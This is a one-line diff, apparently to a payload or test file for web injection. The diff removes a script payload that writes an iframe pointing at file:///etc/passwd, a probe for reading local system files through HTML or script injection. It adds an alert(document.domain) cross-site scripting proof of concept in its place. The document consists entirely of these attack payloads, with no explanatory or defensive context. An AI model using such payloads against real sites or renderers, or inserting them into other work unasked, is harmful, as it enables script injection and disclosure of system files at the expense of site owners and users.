@@ -1,1 +1,1 @@
-<script>document.write('<iframe src=file:///etc/passwd></iframe>');</script>
+alert(document.domain);
